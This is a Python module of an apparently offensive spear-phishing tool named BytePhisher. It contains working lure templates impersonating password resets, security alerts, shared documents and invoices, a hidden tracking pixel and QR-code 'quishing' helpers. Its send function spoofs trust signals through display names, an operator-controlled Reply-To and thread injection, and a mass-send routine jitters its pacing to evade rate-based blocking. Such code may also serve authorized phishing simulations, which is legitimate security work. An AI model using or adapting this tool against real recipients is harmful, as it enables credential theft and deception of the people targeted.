# BytePhisher - SMTP spear-phishing module (package name `mailer` to avoid shadowing stdlib `email`).
# Templates: password reset, security alert, shared doc, invoice.
# Variable substitution: {{To_FirstName}}, {{To_Address}}, {{From_Name}},
# {{Phish_URL}}, etc.
import contextlib
import smtplib
from email.message import EmailMessage
from email.utils import formataddr, formatdate, make_msgid

TEMPLATES = {
    "password_reset": {
        "subject": "Please confirm your password reset",
        "body": """Hi {{To_FirstName}},

We noticed a password reset request for {{To_Address}}.
Click the link below to choose a new password:

    {{Phish_URL}}

If you didn't request this, ignore this email.
""",
    },
    "security_alert": {
        "subject": "[SECURITY] Unusual sign-in detected on your account",
        "body": """Hi {{To_FirstName}},

We detected a sign-in to {{To_Address}} from a new device in {{Location}}.
Verify it was you:

    {{Phish_URL}}

After verification, your session will be restored.
""",
    },
    "shared_doc": {
        "subject": "{{From_Name}} shared a document with you",
        "body": """{{To_FirstName}}, {{From_Name}} shared "{{Doc_Name}}" with you.

Open it now:

    {{Phish_URL}}
""",
    },
    "invoice": {
        "subject": "Invoice #{{Invoice_ID}} is ready for download",
        "body": """Hi {{To_FirstName}},

Your invoice {{Invoice_ID}} is ready. Sign in to download:

    {{Phish_URL}}
""",
    },
}

def render(template_name, context):
    t = TEMPLATES.get(template_name)
    if not t:
        raise KeyError(f"unknown email template: {template_name}")
    def sub(s):
        for k, v in context.items():
            s = s.replace("{{" + k + "}}", str(v))
        return s
    return sub(t["subject"]), sub(t["body"])

TRACKING_PIXEL = ('<img src="{base}/px.gif" width="1" height="1" alt="" '
                  'style="display:none;border:0">')

def tracking_pixel(base):
    """1x1 open-tracking pixel pointing at the BytePhisher server."""
    return TRACKING_PIXEL.format(base=base.rstrip("/"))

def to_html(text, base=None, cta_label="Continue", cta_url=None):
    """Wrap a plaintext template body in a minimal branded HTML mail.
    When `base` is given, a 1x1 tracking pixel is embedded (open tracking)."""
    import html as _html
    paragraphs = []
    for block in text.strip().split("\n\n"):
        block = block.strip()
        if not block:
            continue
        if block.startswith("http") and "\n" not in block:
            paragraphs.append(
                f'<p style="text-align:center;margin:22px 0">'
                f'<a href="{block}" style="background:#2563eb;color:#fff;padding:12px 22px;'
                f'border-radius:6px;text-decoration:none;font-weight:600">{cta_label}</a></p>')
            continue
        paragraphs.append("<p>" + _html.escape(block).replace("\n", "<br>") + "</p>")
    if cta_url:
        paragraphs.append(
            f'<p style="text-align:center"><a href="{cta_url}">{cta_label}</a></p>')
    pixel = tracking_pixel(base) if base else ""
    return (
        '<!doctype html><html><body style="margin:0;background:#eef1f6;'
        'font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif">'
        '<div style="max-width:560px;margin:0 auto;background:#fff;padding:32px 36px;'
        'border-radius:10px">'
        + "".join(paragraphs) +
        '</div>' + pixel + '</body></html>')

def send_smtp(host, port, user, pwd, subject, body_html_or_text, to_addr, use_starttls=True,
              html=False, headers=None, from_name="", reply_to="", to_name="", message_id="",
              in_reply_to="", references="", attachments=None, inline_images=None,
              date=None, dry_run=False):
    """Send one message. STARTTLS and AUTH are used only when the server advertises them,
    so this also works against plain lab relays.

    Identity: `from_name` puts a display name on the From header (a bare address reads as
    bulk mail), `reply_to` aims the answer at a mailbox the operator controls, and
    `in_reply_to`/`references` put the message inside an existing thread. A `Message-ID`
    and a `Date` are generated when the caller does not supply them - a missing Date is
    one of the cheapest bulk-mail tells there is.

    `attachments` is a list of `(filename, bytes, mime)`; `inline_images` is a list of
    `(cid, bytes, mime)` for images referenced as `cid:<name>` in the HTML (the QR path).
    Returns the message object, so a caller can assert on what was sent.
    """
    msg = EmailMessage()
    msg["From"] = formataddr((from_name, user)) if from_name else user
    msg["To"] = formataddr((to_name, to_addr)) if to_name else to_addr
    msg["Subject"] = subject
    msg["Date"] = date or formatdate(localtime=False)
    msg["Message-ID"] = message_id or make_msgid(domain=(user.split("@")[-1] if "@" in user else None))
    if reply_to:
        msg["Reply-To"] = reply_to
    if in_reply_to:
        msg["In-Reply-To"] = in_reply_to
    if references:
        msg["References"] = references
    for k, v in (headers or {}).items():
        if v:
            msg[k] = v
    if html:
        msg.set_content("This message requires an HTML-capable client.")
        msg.add_alternative(body_html_or_text, subtype="html")
    else:
        msg.set_content(body_html_or_text)
    for cid, blob, mime in (inline_images or []):
        maintype, _, subtype = str(mime).partition("/")
        msg.get_payload()[-1].add_related(blob, maintype=maintype or "image",
                                          subtype=subtype or "png", cid=f"<{cid}>")
    for filename, blob, mime in (attachments or []):
        maintype, _, subtype = str(mime).partition("/")
        params = {"method": "REQUEST"} if (subtype or "").lower() == "calendar" else None
        msg.add_attachment(blob, maintype=maintype or "application",
                           subtype=subtype or "octet-stream", filename=filename,
                           params=params)
    if dry_run or not host:
        return msg
    s = smtplib.SMTP(host, port, timeout=20)
    try:
        s.ehlo()
        if use_starttls and s.has_extn("starttls"):
            s.starttls()
            s.ehlo()
        if user and pwd and s.has_extn("auth"):
            s.login(user, pwd)
        s.send_message(msg)
    finally:
        with contextlib.suppress(Exception):
            s.quit()
    return msg


def qr_image(url, ecc="M", scale=6, border=4, cid="qr"):
    """(cid, png bytes, mime) for the inline QR of a lure URL."""
    from core import qr as _qr
    return (cid, _qr.png(_qr.encode(url, ecc=ecc), scale=scale, border=border), "image/png")


def qr_html(url, label="Scan to continue", cid="qr"):
    """The HTML block that shows the QR (the mail-side quishing payload)."""
    return ('<div style="text-align:center;margin:18px 0">'
            f'<img src="cid:{cid}" alt="QR" width="180" height="180" '
            'style="border:1px solid #e3e3e3;border-radius:8px;padding:8px;background:#fff">'
            f'<div style="font:13px system-ui;color:#555;margin-top:6px">{label}</div></div>')


def blast(host, port, user, pwd, recipients, template_name, context, use_starttls=True,
          min_delay=0.0, max_delay=0.0, sleep=None, rng=None, send=None, on_result=None):
    """Send the template to every recipient, paced.

    Pacing matters more than the template: a hundred messages in one second from a fresh
    domain is a rate-based block, and the jitter keeps the arrival times from forming a
    pattern. `sleep`, `rng` and `send` are injectable so a test can run without waiting.
    Returns a list of `(address, ok, detail)`.
    """
    import random as _random
    import time as _time
    sleep = sleep or _time.sleep
    rng = rng or _random
    send = send or send_smtp
    results = []
    for index, addr in enumerate(recipients):
        subject, body = render(template_name, {**context, "To_Address": addr})
        delay = 0.0
        if index and (min_delay or max_delay):
            low = min(min_delay, max_delay) if max_delay else min_delay
            high = max(min_delay, max_delay)
            delay = rng.uniform(low, high)
            sleep(delay)
        try:
            send(host, port, user, pwd, subject, body, addr, use_starttls=use_starttls)
            results.append((addr, True, f"sent after {delay:.1f}s" if delay else "sent"))
        except Exception as e:
            results.append((addr, False, f"{type(e).__name__}: {e}"))
        if on_result:
            on_result(results[-1])
    return results
